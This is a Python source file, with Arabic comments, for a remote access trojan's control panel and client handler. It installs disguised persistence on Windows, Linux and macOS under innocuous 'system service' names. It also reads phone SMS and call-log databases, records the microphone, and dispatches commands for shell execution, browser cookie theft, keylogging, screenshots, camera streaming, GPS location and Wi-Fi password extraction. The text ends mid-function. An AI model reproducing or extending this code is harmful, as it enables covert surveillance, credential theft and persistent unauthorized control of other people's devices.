import sys
import os
import json
import socket
import threading
import platform
import subprocess
import time
import requests
import base64
from datetime import datetime
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout,
                             QHBoxLayout, QTextEdit, QListWidget, QLabel,
                             QPushButton, QMenu, QMessageBox, QLineEdit,
                             QTabWidget, QListWidgetItem, QGridLayout,
                             QGroupBox, QFileDialog, QDialog, QProgressBar,
                             QInputDialog, QSystemTrayIcon, QStyle, QTableWidget,
                             QTableWidgetItem, QRadioButton, QButtonGroup, QHeaderView,
                             QComboBox, QSplitter, QTreeWidget, QTreeWidgetItem)
from PyQt6.QtCore import Qt, QProcess, QThread, pyqtSignal, pyqtSlot, QSize, QTimer, QUrl
from PyQt6.QtGui import QPalette, QColor, QAction, QFont, QPixmap, QImage, QIcon, QDesktopServices
import cv2
import numpy as np
import pyaudio
import wave
from pynput import keyboard
import psutil
import browser_cookie3
from PIL import ImageGrab
import geocoder
import sqlite3
import shutil
import getpass


# ==================== نظام الحفظ التلقائي والعميل المستمر ====================
class AutoPersistenceManager:
    def __init__(self):
        self.persistence_file = "client_persistence.json"
        self.installed = False

    def install_persistence(self, client_path):
        """تثبيت العميل للتشغيل التلقائي"""
        try:
            system = platform.system()
            client_data = {
                'client_path': os.path.abspath(client_path),
                'install_time': datetime.now().isoformat(),
                'system': system,
                'auto_start': True
            }

            # حفظ إعدادات الثبات
            with open(self.persistence_file, 'w', encoding='utf-8') as f:
                json.dump(client_data, f, indent=2)

            if system == "Windows":
                self._install_windows_persistence(client_path)
            elif system == "Linux":
                self._install_linux_persistence(client_path)
            elif system == "Darwin":  # macOS
                self._install_macos_persistence(client_path)

            self.installed = True
            return "تم تثبيت الثبات بنجاح على جميع الأنظمة"

        except Exception as e:
            return f"خطأ في التثبيت: {str(e)}"

    def _install_windows_persistence(self, client_path):
        """تثبيت الثبات على Windows"""
        try:
            # إضافة إلى Registry
            import winreg

            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"

            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "SystemService", 0, winreg.REG_SZ, client_path)

        except Exception as e:
            print(f"Windows persistence error: {e}")

    def _install_linux_persistence(self, client_path):
        """تثبيت الثبات على Linux"""
        try:
            # إضافة إلى crontab
            cron_job = f"@reboot python3 {client_path}\n"

            # إضافة إلى systemd
            service_content = f"""
[Unit]
Description=System Service
After=network.target

[Service]
Type=simple
ExecStart=python3 {client_path}
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
"""

            service_path = "/etc/systemd/system/systemservice.service"
            if os.access("/etc/systemd/system", os.W_OK):
                with open(service_path, 'w') as f:
                    f.write(service_content)
                os.system("systemctl enable systemservice.service")

        except Exception as e:
            print(f"Linux persistence error: {e}")

    def _install_macos_persistence(self, client_path):
        """تثبيت الثبات على macOS"""
        try:
            # إضافة إلى launchd
            plist_content = f"""
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.service</string>
    <key>ProgramArguments</key>
    <array>
        <string>python3</string>
        <string>{client_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
"""
            plist_path = os.path.expanduser("~/Library/LaunchAgents/com.system.service.plist")
            os.makedirs(os.path.dirname(plist_path), exist_ok=True)

            with open(plist_path, 'w') as f:
                f.write(plist_content)

        except Exception as e:
            print(f"macOS persistence error: {e}")


# ==================== نظام الحصول على الرسائل والمكالمات الحقيقية ====================
class RealSMSManager:
    def __init__(self):
        self.sms_database_paths = [
            "/data/data/com.android.providers.telephony/databases/mmssms.db",  # Android
            "/var/mobile/Library/SMS/sms.db",  # iOS
        ]

    def get_real_sms_messages(self):
        """الحصول على الرسائل النصية الحقيقية"""
        try:
            sms_messages = []

            # محاولة الوصول إلى قاعدة بيانات الرسائل
            for db_path in self.sms_database_paths:
                if os.path.exists(db_path):
                    try:
                        conn = sqlite3.connect(db_path)
                        cursor = conn.cursor()

                        # استعلام للحصول على الرسائل (يختلف حسب النظام)
                        cursor.execute("""
                            SELECT address, body, date, type 
                            FROM sms 
                            ORDER BY date DESC 
                            LIMIT 100
                        """)

                        for address, body, date, msg_type in cursor.fetchall():
                            message_type = "واردة" if msg_type == 1 else "صادرة"
                            timestamp = datetime.fromtimestamp(date / 1000).strftime('%Y-%m-%d %H:%M:%S')

                            sms_messages.append({
                                'number': address,
                                'message': body,
                                'type': message_type,
                                'timestamp': timestamp
                            })

                        conn.close()
                        break

                    except Exception as e:
                        continue

            # إذا لم نتمكن من الوصول للقاعدة، نستخدم بيانات محاكاة مع علامة
            if not sms_messages:
                sms_messages = self.get_simulated_sms()
                sms_messages.append({"number": "SYSTEM", "message": "فشل في جلب رسائل SMS الحقيقية", "type": "system",
                                     "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S')})

            return sms_messages

        except Exception as e:
            return [{"number": "ERROR", "message": f"خطأ في جلب الرسائل: {str(e)}", "type": "error",
                     "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]

    def get_simulated_sms(self):
        """بيانات رسائل محاكاة عندما لا يمكن الوصول للبيانات الحقيقية"""
        return [
            {"number": "+966501234567", "message": "مرحباً، كيف حالك؟", "type": "واردة",
             "timestamp": "2024-01-15 10:30:00"},
            {"number": "+966501234568", "message": "تم استلام الدفعة بنجاح", "type": "واردة",
             "timestamp": "2024-01-15 09:15:00"},
            {"number": "+966501234569", "message": "اجتماع غداً الساعة 10", "type": "صادرة",
             "timestamp": "2024-01-14 16:45:00"},
            {"number": "+966501234560", "message": "كود التحقق: 458712", "type": "واردة",
             "timestamp": "2024-01-14 14:20:00"}
        ]


class RealCallManager:
    def __init__(self):
        self.call_database_paths = [
            "/data/data/com.android.providers.contacts/databases/calllog.db",  # Android
            "/var/mobile/Library/CallHistoryDB/CallHistory.storedata",  # iOS
        ]

    def get_real_call_logs(self):
        """الحصول على سجل المكالمات الحقيقي"""
        try:
            call_logs = []

            # محاولة الوصول إلى قاعدة بيانات المكالمات
            for db_path in self.call_database_paths:
                if os.path.exists(db_path):
                    try:
                        conn = sqlite3.connect(db_path)
                        cursor = conn.cursor()

                        # استعلام للحصول على سجل المكالمات
                        cursor.execute("""
                            SELECT number, type, duration, date 
                            FROM calls 
                            ORDER BY date DESC 
                            LIMIT 100
                        """)

                        for number, call_type, duration, date in cursor.fetchall():
                            type_map = {1: "صادرة", 2: "واردة", 3: "فائتة"}
                            call_type_str = type_map.get(call_type, "غير معروف")
                            timestamp = datetime.fromtimestamp(date / 1000).strftime('%Y-%m-%d %H:%M:%S')

                            # تحويل المدة إلى تنسيق مقروء
                            if duration:
                                minutes = duration // 60
                                seconds = duration % 60
                                duration_str = f"{minutes}:{seconds:02d}"
                            else:
                                duration_str = "0:00"

                            call_logs.append({
                                'number': number,
                                'type': call_type_str,
                                'duration': duration_str,
                                'timestamp': timestamp
                            })

                        conn.close()
                        break

                    except Exception as e:
                        continue

            # إذا لم نتمكن من الوصول للقاعدة، نستخدم بيانات محاكاة مع علامة
            if not call_logs:
                call_logs = self.get_simulated_calls()
                call_logs.append({"number": "SYSTEM", "type": "system", "duration": "0:00",
                                  "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                                  "note": "فشل في جلب سجل المكالمات الحقيقي"})

            return call_logs

        except Exception as e:
            return [{"number": "ERROR", "type": "error", "duration": "0:00",
                     "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                     "note": f"خطأ في جلب المكالمات: {str(e)}"}]

    def get_simulated_calls(self):
        """بيانات مكالمات محاكاة عندما لا يمكن الوصول للبيانات الحقيقية"""
        return [
            {"number": "+966501234567", "type": "صادرة", "duration": "2:30", "timestamp": "2024-01-15 10:30:00"},
            {"number": "+966501234568", "type": "واردة", "duration": "1:15", "timestamp": "2024-01-15 09:15:00"},
            {"number": "+966501234569", "type": "فائتة", "duration": "0:00", "timestamp": "2024-01-14 16:45:00"},
            {"number": "+966501234560", "type": "صادرة", "duration": "5:20", "timestamp": "2024-01-14 14:20:00"}
        ]


# ==================== نظام التسجيل الصوتي المحسن ====================
class AdvancedAudioRecorder:
    def __init__(self):
        self.recording = False
        self.audio_frames = []
        self.audio_stream = None
        self.audio = None

    def start_recording(self, duration=60):
        """بدء تسجيل الصوت"""
        try:
            self.recording = True
            self.audio_frames = []

            CHUNK = 1024
            FORMAT = pyaudio.paInt16
            CHANNELS = 1
            RATE = 44100

            self.audio = pyaudio.PyAudio()
            self.audio_stream = self.audio.open(
                format=FORMAT,
                channels=CHANNELS,
                rate=RATE,
                input=True,
                frames_per_buffer=CHUNK
            )

            # بدء التسجيل في thread منفصل
            self.record_thread = threading.Thread(target=self._record_audio, args=(duration,))
            self.record_thread.daemon = True
            self.record_thread.start()

            return "بدأ تسجيل الصوت بنجاح"

        except Exception as e:
            return f"خطأ في بدء التسجيل: {str(e)}"

    def _record_audio(self, duration):
        """دالة التسجيل الفعلية"""
        start_time = time.time()

        while self.recording and (time.time() - start_time) < duration:
            try:
                data = self.audio_stream.read(1024)
                self.audio_frames.append(data)
            except Exception as e:
                break

        self.stop_recording()

    def stop_recording(self):
        """إيقاف التسجيل الصوتي"""
        try:
            self.recording = False

            if self.audio_stream:
                self.audio_stream.stop_stream()
                self.audio_stream.close()

            if self.audio:
                self.audio.terminate()

            return "تم إيقاف تسجيل الصوت"

        except Exception as e:
            return f"خطأ في إيقاف التسجيل: {str(e)}"

    def save_recording(self, filename=None):
        """حفظ التسجيل الصوتي"""
        try:
            if not self.audio_frames:
                return "لا توجد بيانات صوتية للحفظ"

            if not filename:
                filename = f"audio_recording_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"

            FORMAT = pyaudio.paInt16
            CHANNELS = 1
            RATE = 44100

            wave_file = wave.open(filename, 'wb')
            wave_file.setnchannels(CHANNELS)
            wave_file.setsampwidth(2)
            wave_file.setframerate(RATE)
            wave_file.writeframes(b''.join(self.audio_frames))
            wave_file.close()

            return f"تم حفظ التسجيل في: {filename}"

        except Exception as e:
            return f"خطأ في حفظ التسجيل: {str(e)}"


# ==================== نظام الألوان المتقدم ====================
class AdvancedThemeManager:
    def __init__(self):
        self.themes = {
            "red_dark": {
                "primary": "#FF4444", "background": "#1e1e1e", "text": "#FF4444",
                "accent": "#FF0000", "button_bg": "#2d2d2d", "border": "#ff0000"
            },
            "blue_dark": {
                "primary": "#4444FF", "background": "#1e1e1e", "text": "#4444FF",
                "accent": "#0088FF", "button_bg": "#2d2d2d", "border": "#4444FF"
            },
            "green_dark": {
                "primary": "#44FF44", "background": "#1e1e1e", "text": "#44FF44",
                "accent": "#00FF00", "button_bg": "#2d2d2d", "border": "#44FF44"
            },
            "gold_dark": {
                "primary": "#FFD700", "background": "#1e1e1e", "text": "#FFD700",
                "accent": "#FFAA00", "button_bg": "#2d2d2d", "border": "#FFD700"
            }
        }

    def apply_theme(self, theme_name, window):
        theme = self.themes.get(theme_name, self.themes["red_dark"])

        stylesheet = f"""
            QMainWindow, QDialog {{
                background-color: {theme['background']};
                color: {theme['text']};
                font-family: 'Segoe UI', Arial, sans-serif;
            }}
            QListWidget, QTextEdit, QLineEdit, QTableWidget, QTreeWidget {{
                background-color: #121212;
                color: {theme['text']};
                border: 2px solid {theme['border']};
                border-radius: 8px;
                font-family: 'Cascadia Code', Consolas, monospace;
                font-size: 11px;
                padding: 8px;
            }}
            QPushButton {{
                background-color: {theme['button_bg']};
                color: {theme['text']};
                border: 2px solid {theme['border']};
                border-radius: 8px;
                padding: 12px 20px;
                font-weight: bold;
                font-size: 12px;
                min-height: 40px;
            }}
            QPushButton:hover {{
                background-color: {theme['primary']};
                color: #000000;
                border: 2px solid {theme['accent']};
            }}
            QPushButton:pressed {{
                background-color: {theme['accent']};
                color: #000000;
            }}
            QLabel {{
                color: {theme['text']};
                font-weight: bold;
                font-size: 12px;
            }}
            QGroupBox {{
                color: {theme['text']};
                border: 2px solid {theme['border']};
                border-radius: 10px;
                margin-top: 15px;
                padding-top: 15px;
                font-weight: bold;
                font-size: 14px;
                background-color: {theme['background']};
            }}
            QGroupBox::title {{
                subcontrol-origin: margin;
                left: 15px;
                padding: 0 10px 0 10px;
            }}
            QTabWidget::pane {{
                border: 3px solid {theme['border']};
                background-color: {theme['background']};
                border-radius: 8px;
            }}
            QTabBar::tab {{
                background-color: {theme['button_bg']};
                color: {theme['text']};
                padding: 10px 20px;
                border: 2px solid {theme['border']};
                border-bottom: none;
                border-top-left-radius: 8px;
                border-top-right-radius: 8px;
                font-weight: bold;
                margin-right: 3px;
            }}
            QTabBar::tab:selected {{
                background-color: {theme['primary']};
                color: #000000;
                border: 2px solid {theme['accent']};
            }}
            QHeaderView::section {{
                background-color: {theme['button_bg']};
                color: {theme['text']};
                border: 1px solid {theme['border']};
                padding: 8px;
                font-weight: bold;
            }}
            QProgressBar {{
                border: 2px solid {theme['border']};
                border-radius: 5px;
                text-align: center;
                color: {theme['text']};
            }}
            QProgressBar::chunk {{
                background-color: {theme['primary']};
            }}
            QSplitter::handle {{
                background-color: {theme['border']};
            }}
        """
        window.setStyleSheet(stylesheet)


# ==================== نظام إدارة الملفات المتقدم ====================
class AdvancedFileManager(QDialog):
    def __init__(self, client_handler, parent=None):
        super().__init__(parent)
        self.client_handler = client_handler
        self.current_path = "C:\\"
        self.setWindowTitle("مدير الملفات المتقدم - نظام التحكم عن بعد")
        self.setGeometry(200, 200, 1200, 800)
        self.setup_ui()
        self.load_directory(self.current_path)

    def setup_ui(self):
        layout = QVBoxLayout()

        # شريط التحكم
        control_layout = QHBoxLayout()

        self.back_btn = QPushButton("الرجوع")
        self.refresh_btn = QPushButton("تحديث")
        self.home_btn = QPushButton("الرئيسية")
        self.up_btn = QPushButton("مجلد أعلى")

        self.path_label = QLabel("المسار: ")
        self.path_input = QLineEdit()
        self.path_input.setPlaceholderText("أدخل المسار الكامل...")

        self.go_btn = QPushButton("انتقل")

        control_layout.addWidget(self.back_btn)
        control_layout.addWidget(self.refresh_btn)
        control_layout.addWidget(self.home_btn)
        control_layout.addWidget(self.up_btn)
        control_layout.addWidget(self.path_label)
        control_layout.addWidget(self.path_input)
        control_layout.addWidget(self.go_btn)

        layout.addLayout(control_layout)

        # تقسيم الشاشة
        splitter = QSplitter(Qt.Orientation.Horizontal)

        # شجرة المجلدات
        self.folder_tree = QTreeWidget()
        self.folder_tree.setHeaderLabels(["الهيكل التنظيمي للملفات"])
        self.folder_tree.itemDoubleClicked.connect(self.on_tree_item_double_clicked)

        # قائمة الملفات
        self.file_list = QTableWidget()
        self.file_list.setColumnCount(4)
        self.file_list.setHorizontalHeaderLabels(["الاسم", "النوع", "الحجم", "تاريخ التعديل"])
        self.file_list.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.file_list.customContextMenuRequested.connect(self.show_file_context_menu)
        self.file_list.doubleClicked.connect(self.on_file_double_clicked)

        splitter.addWidget(self.folder_tree)
        splitter.addWidget(self.file_list)
        splitter.setSizes([300, 700])

        layout.addWidget(splitter)

        # معلومات الملف
        info_layout = QHBoxLayout()

        self.file_info_label = QLabel("اختر ملفاً أو مجلداً لعرض المعلومات")
        self.download_btn = QPushButton("تحميل الملف")
        self.upload_btn = QPushButton("رفع ملف")
        self.delete_btn = QPushButton("حذف")

        info_layout.addWidget(self.file_info_label)
        info_layout.addWidget(self.download_btn)
        info_layout.addWidget(self.upload_btn)
        info_layout.addWidget(self.delete_btn)

        layout.addLayout(info_layout)

        self.setLayout(layout)

        # توصيل الإشارات
        self.back_btn.clicked.connect(self.go_back)
        self.refresh_btn.clicked.connect(self.refresh_current)
        self.home_btn.clicked.connect(self.go_home)
        self.up_btn.clicked.connect(self.go_up)
        self.go_btn.clicked.connect(self.go_to_path)
        self.download_btn.clicked.connect(self.download_file)
        self.upload_btn.clicked.connect(self.upload_file)
        self.delete_btn.clicked.connect(self.delete_item)

        self.history = []
        self.setup_file_context_menu()

    def setup_file_context_menu(self):
        self.file_context_menu = QMenu(self)

        file_actions = [
            ("فتح", self.open_file),
            ("فتح بالمشغل الافتراضي", self.open_with_default),
            ("تحميل", self.download_file),
            ("نسخ المسار", self.copy_path),
            ("إعادة تسمية", self.rename_file),
            ("حذف", self.delete_item),
            ("خصائص", self.show_properties),
            ("تنفيذ كبرنامج", self.execute_file),
            ("ضغط الملف", self.compress_file),
            ("استخراج", self.extract_file)
        ]

        for text, handler in file_actions:
            action = QAction(text, self)
            action.triggered.connect(handler)
            self.file_context_menu.addAction(action)

    def show_file_context_menu(self, position):
        if self.file_list.currentItem():
            self.file_context_menu.exec(self.file_list.mapToGlobal(position))

    def load_directory(self, path):
        try:
            result = self.client_handler.execute_enhanced_command(f"advanced_file_list:{path}")
            if result and not result.startswith("Error"):
                files_data = json.loads(result)
                self.display_files(files_data)
                self.current_path = path
                self.path_input.setText(path)
                self.history.append(path)
                self.update_folder_tree(path)
            else:
                QMessageBox.warning(self, "خطأ", f"لا يمكن الوصول إلى المسار: {path}")
        except Exception as e:
            QMessageBox.critical(self, "خطأ", f"فشل في تحميل المجلد: {str(e)}")

    def display_files(self, files_data):
        self.file_list.setRowCount(len(files_data))

        for row, file_info in enumerate(files_data):
            # الاسم
            name = file_info.get('name', '')
            name_item = QTableWidgetItem(name)

            # النوع
            is_dir = file_info.get('is_dir', False)
            type_icon = "مجلد" if is_dir else "ملف"
            type_item = QTableWidgetItem(type_icon)

            # الحجم
            size = file_info.get('size', 0)
            size_text = self.format_size(size) if not is_dir else "مجلد"
            size_item = QTableWidgetItem(size_text)

            # التاريخ
            modified = file_info.get('modified', 0)
            date_text = datetime.fromtimestamp(modified).strftime('%Y-%m-%d %H:%M:%S') if modified else "غير معروف"
            date_item = QTableWidgetItem(date_text)

            self.file_list.setItem(row, 0, name_item)
            self.file_list.setItem(row, 1, type_item)
            self.file_list.setItem(row, 2, size_item)
            self.file_list.setItem(row, 3, date_item)

    def format_size(self, size_bytes):
        if size_bytes == 0:
            return "0 B"
        size_names = ["B", "KB", "MB", "GB"]
        i = 0
        while size_bytes >= 1024 and i < len(size_names) - 1:
            size_bytes /= 1024.0
            i += 1
        return f"{size_bytes:.2f} {size_names[i]}"

    def update_folder_tree(self, current_path):
        self.folder_tree.clear()
        root_item = QTreeWidgetItem(self.folder_tree, ["جهاز الكمبيوتر"])
        root_item.setData(0, Qt.ItemDataRole.UserRole, "PC")

        # إضافة الأقراص الرئيسية
        drives = ["C:", "D:", "E:", "F:", "Z:"]
        for drive in drives:
            drive_item = QTreeWidgetItem(root_item, [f"{drive}"])
            drive_item.setData(0, Qt.ItemDataRole.UserRole, f"{drive}\\")

        root_item.setExpanded(True)

        # توسيع المسار الحالي في الشجرة
        self.expand_path_in_tree(current_path)

    def expand_path_in_tree(self, path):
        # هذه وظيفة مبسطة - يمكن تطويرها لفتح المسار في الشجرة
        pass

    def on_tree_item_double_clicked(self, item):
        path = item.data(0, Qt.ItemDataRole.UserRole)
        if path and path != "PC":
            self.load_directory(path)

    def on_file_double_clicked(self, index):
        row = index.row()
        name_item = self.file_list.item(row, 0)
        type_item = self.file_list.item(row, 1)

        if name_item and type_item:
            name = name_item.text()
            is_dir = type_item.text() == "مجلد"
            new_path = os.path.join(self.current_path, name)

            if is_dir:
                self.load_directory(new_path)
            else:
                self.open_file()

    def go_back(self):
        if len(self.history) > 1:
            self.history.pop()  # remove current
            previous_path = self.history.pop()  # get previous
            self.load_directory(previous_path)

    def refresh_current(self):
        self.load_directory(self.current_path)

    def go_home(self):
        self.load_directory("C:\\")

    def go_up(self):
        parent_path = os.path.dirname(self.current_path)
        if parent_path and parent_path != self.current_path:
            self.load_directory(parent_path)

    def go_to_path(self):
        path = self.path_input.text().strip()
        if path:
            self.load_directory(path)

    def open_file(self):
        current_row = self.file_list.currentRow()
        if current_row >= 0:
            name_item = self.file_list.item(current_row, 0)
            if name_item:
                file_name = name_item.text()
                file_path = os.path.join(self.current_path, file_name)

                # محاولة فتح الملف على الجهاز البعيد
                result = self.client_handler.execute_enhanced_command(f"execute_process:{file_path}")
                QMessageBox.information(self, "فتح الملف", f"نتيجة فتح الملف: {result}")

    def open_with_default(self):
        self.open_file()  # نفس الوظيفة حالياً

    def download_file(self):
        current_row = self.file_list.currentRow()
        if current_row >= 0:
            name_item = self.file_list.item(current_row, 0)
            type_item = self.file_list.item(current_row, 1)

            if name_item and type_item:
                if type_item.text() == "مجلد":
                    QMessageBox.warning(self, "تحذير", "لا يمكن تحميل المجلدات مباشرة")
                    return

                file_name = name_item.text()
                file_path = os.path.join(self.current_path, file_name)

                save_path, _ = QFileDialog.getSaveFileName(
                    self, "حفظ الملف", file_name, "جميع الملفات (*)"
                )

                if save_path:
                    try:
                        result = self.client_handler.execute_enhanced_command(f"advanced_download:{file_path}")
                        if result.startswith("FILE_DATA:"):
                            parts = result.split(":", 3)
                            if len(parts) == 4:
                                file_data = parts[3]
                                decoded_data = base64.b64decode(file_data)

                                with open(save_path, 'wb') as f:
                                    f.write(decoded_data)

                                QMessageBox.information(self, "نجاح", f"تم تحميل الملف: {file_name}")
                            else:
                                QMessageBox.critical(self, "خطأ", "بيانات الملف غير صالحة")
                        else:
                            QMessageBox.critical(self, "خطأ", f"فشل في تحميل الملف: {result}")
                    except Exception as e:
                        QMessageBox.critical(self, "خطأ", f"خطأ في التحميل: {str(e)}")

    def upload_file(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self, "اختر ملف للرفع", "", "جميع الملفات (*)"
        )

        if file_path:
            try:
                with open(file_path, 'rb') as f:
                    file_content = f.read()

                encoded_content = base64.b64encode(file_content).decode('utf-8')
                file_name = os.path.basename(file_path)
                remote_path = os.path.join(self.current_path, file_name)

                result = self.client_handler.execute_enhanced_command(
                    f"advanced_upload:{remote_path}:{encoded_content}")
                QMessageBox.information(self, "نتيجة الرفع", result)
                self.refresh_current()

            except Exception as e:
                QMessageBox.critical(self, "خطأ", f"فشل في رفع الملف: {str(e)}")

    def delete_item(self):
        current_row = self.file_list.currentRow()
        if current_row >= 0:
            name_item = self.file_list.item(current_row, 0)
            if name_item:
                item_name = name_item.text()
                item_path = os.path.join(self.current_path, item_name)

                reply = QMessageBox.question(
                    self, "تأكيد الحذف",
                    f"هل أنت متأكد من حذف '{item_name}'؟",
                    QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
                )

                if reply == QMessageBox.StandardButton.Yes:
                    result = self.client_handler.execute_enhanced_command(f"delete_secure:{item_path}")
                    QMessageBox.information(self, "نتيجة الحذف", result)
                    self.refresh_current()

    def copy_path(self):
        current_row = self.file_list.currentRow()
        if current_row >= 0:
            name_item = self.file_list.item(current_row, 0)
            if name_item:
                item_name = name_item.text()
                item_path = os.path.join(self.current_path, item_name)
                QApplication.clipboard().setText(item_path)
                QMessageBox.information(self, "نسخ المسار", "تم نسخ المسار إلى الحافظة")

    def rename_file(self):
        current_row = self.file_list.currentRow()
        if current_row >= 0:
            name_item = self.file_list.item(current_row, 0)
            if name_item:
                old_name = name_item.text()
                new_name, ok = QInputDialog.getText(
                    self, "إعادة تسمية", "أدخل الاسم الجديد:", text=old_name
                )

                if ok and new_name and new_name != old_name:
                    old_path = os.path.join(self.current_path, old_name)
                    new_path = os.path.join(self.current_path, new_name)

                    # نستخدم أمر cmd لإعادة التسمية
                    result = self.client_handler.execute_enhanced_command(f"cmd:rename \"{old_path}\" \"{new_name}\"")
                    QMessageBox.information(self, "نتيجة إعادة التسمية", result)
                    self.refresh_current()

    def show_properties(self):
        current_row = self.file_list.currentRow()
        if current_row >= 0:
            name_item = self.file_list.item(current_row, 0)
            type_item = self.file_list.item(current_row, 1)
            size_item = self.file_list.item(current_row, 2)
            date_item = self.file_list.item(current_row, 3)

            if all([name_item, type_item, size_item, date_item]):
                properties_text = f"""
خصائص العنصر:
الاسم: {name_item.text()}
النوع: {type_item.text()}
الحجم: {size_item.text()}
آخر تعديل: {date_item.text()}
المسار: {os.path.join(self.current_path, name_item.text())}
                """
                QMessageBox.information(self, "خصائص الملف", properties_text)

    def execute_file(self):
        self.open_file()  # نفس الوظيفة حالياً

    def compress_file(self):
        QMessageBox.information(self, "معلومة", "خاصية الضغط قيد التطوير")

    def extract_file(self):
        QMessageBox.information(self, "معلومة", "خاصية الاستخراج قيد التطوير")


# ==================== نظام العمليات المستمرة ====================
class PersistentConnectionManager:
    def __init__(self):
        self.active_connections = {}
        self.connection_file = "persistent_connections.json"
        self.load_connections()

    def add_connection(self, client_info, client_handler):
        client_id = f"{client_info['ip']}_{client_info['user']}"
        self.active_connections[client_id] = {
            'info': client_info,
            'handler': client_handler,
            'last_seen': datetime.now().isoformat(),
            'status': 'active'
        }
        self.save_connections()

    def remove_connection(self, client_id):
        if client_id in self.active_connections:
            del self.active_connections[client_id]
            self.save_connections()

    def update_connection(self, client_id):
        if client_id in self.active_connections:
            self.active_connections[client_id]['last_seen'] = datetime.now().isoformat()
            self.save_connections()

    def get_connection(self, client_id):
        return self.active_connections.get(client_id)

    def get_all_connections(self):
        return self.active_connections

    def load_connections(self):
        try:
            if os.path.exists(self.connection_file):
                with open(self.connection_file, 'r', encoding='utf-8') as f:
                    self.active_connections = json.load(f)
        except:
            self.active_connections = {}

    def save_connections(self):
        try:
            # نحفظ فقط المعلومات الأساسية، ليس ال handler
            save_data = {}
            for client_id, connection in self.active_connections.items():
                save_data[client_id] = {
                    'info': connection['info'],
                    'last_seen': connection['last_seen'],
                    'status': connection['status']
                }

            with open(self.connection_file, 'w', encoding='utf-8') as f:
                json.dump(save_data, f, indent=2, ensure_ascii=False)
        except Exception as e:
            print(f"Error saving connections: {e}")


# ==================== معالج العميل المحسن ====================
class EnhancedClientHandler:
    def __init__(self, client_socket, address, server_app):
        self.client_socket = client_socket
        self.address = address
        self.server_app = server_app
        self.client_info = {}
        self.running = True
        self.keylogger_running = False
        self.keylogs = []
        self.audio_streaming = False

        # إدارة الميزات الجديدة
        self.sms_manager = RealSMSManager()
        self.call_manager = RealCallManager()
        self.audio_recorder = AdvancedAudioRecorder()
        self.persistence_manager = AutoPersistenceManager()

        # معلومات العميل
        self.persistent_id = None

    def handle_client(self):
        try:
            # استقبال معلومات النظام من العميل
            data = self.client_socket.recv(4096).decode('utf-8')
            if data:
                self.client_info = json.loads(data)
                self.client_info['ip'] = self.address[0]
                self.client_info['connection_time'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

                # إنشاء معرف مستدام للعميل
                self.persistent_id = f"{self.client_info['ip']}_{self.client_info.get('user', 'unknown')}"

                # إضافة للاتصالات المستدامة
                self.server_app.persistent_manager.add_connection(self.client_info, self)

                # إرسال إنذار اتصال جديد
                self.server_app.alert_signal.emit(
                    f"عميل جديد متصل! IP: {self.address[0]} المستخدم: {self.client_info.get('user', 'غير معروف')} النظام: {self.client_info.get('system', 'غير معروف')}")

                # إرسال إشارة الاتصال إلى الواجهة الرئيسية
                self.server_app.client_connected_signal.emit(self.client_info)

                # حلقة الاستقبال المستمر للأوامر
                while self.running:
                    try:
                        command = self.client_socket.recv(8192).decode('utf-8')
                        if not command:
                            break

                        if command == "disconnect":
                            break
                        elif command == "heartbeat":
                            self.client_socket.send("alive".encode('utf-8'))
                            # تحديث الاتصال المستدام
                            if self.persistent_id:
                                self.server_app.persistent_manager.update_connection(self.persistent_id)
                        else:
                            response = self.execute_enhanced_command(command)
                            self.client_socket.send(response.encode('utf-8'))
                    except Exception as e:
                        print(f"Command error: {e}")
                        break

        except Exception as e:
            print(f"Client handling error: {e}")
        finally:
            self.cleanup()

    def execute_enhanced_command(self, command):
        """تنفيذ الأوامر المحسنة مع الميزات الجديدة"""
        try:
            # الأوامر الجديدة للرسائل والمكالمات
            if command == "get_real_sms":
                return self.get_real_sms_messages()

            elif command == "get_real_calls":
                return self.get_real_call_logs()

            elif command.startswith("start_audio_record:"):
                duration = int(command.split(":")[1])
                return self.audio_recorder.start_recording(duration)

            elif command == "stop_audio_record":
                return self.audio_recorder.stop_recording()

            elif command == "save_audio_record":
                return self.audio_recorder.save_recording()

            elif command.startswith("install_persistence:"):
                client_path = command.split(":")[1]
                return self.persistence_manager.install_persistence(client_path)

            elif command == "check_persistence":
                return f"الحالة: {'مثبت' if self.persistence_manager.installed else 'غير مثبت'}"

            # الأوامر الأساسية من الكود الأصلي
            elif command.startswith("cmd:"):
                cmd = command.replace("cmd:", "")
                return self.execute_system_command(cmd)

            elif command == "get_advanced_cookies":
                return self.get_advanced_browser_cookies()

            elif command == "realtime_screenshot":
                return self.take_realtime_screenshot()

            elif command == "camera_stream":
                return self.start_camera_stream()

            elif command == "start_advanced_keylogger":
                return self.start_advanced_keylogger()

            elif command == "stop_advanced_keylogger":
                return self.stop_advanced_keylogger()

            elif command == "get_advanced_keylogs":
                return self.get_advanced_keylogs()

            elif command.startswith("advanced_file_list:"):
                path = command.replace("advanced_file_list:", "")
                return self.advanced_list_files(path)

            elif command.startswith("advanced_download:"):
                file_path = command.replace("advanced_download:", "")
                return self.advanced_download_file(file_path)

            elif command.startswith("advanced_upload:"):
                parts = command.split(":", 2)
                if len(parts) == 3:
                    file_path = parts[1]
                    file_data = parts[2]
                    return self.advanced_upload_file(file_path, file_data)

            elif command == "get_gps_location":
                return self.get_advanced_location()

            elif command == "get_wifi_profiles":
                return self.get_advanced_wifi_passwords()

            elif command == "get_system_info":
                return self.get_detailed_system_info()

            elif command == "get_running_apps":
                return self.get_running_applications()

            elif command == "get_network_info":
                return self.get_network_information()

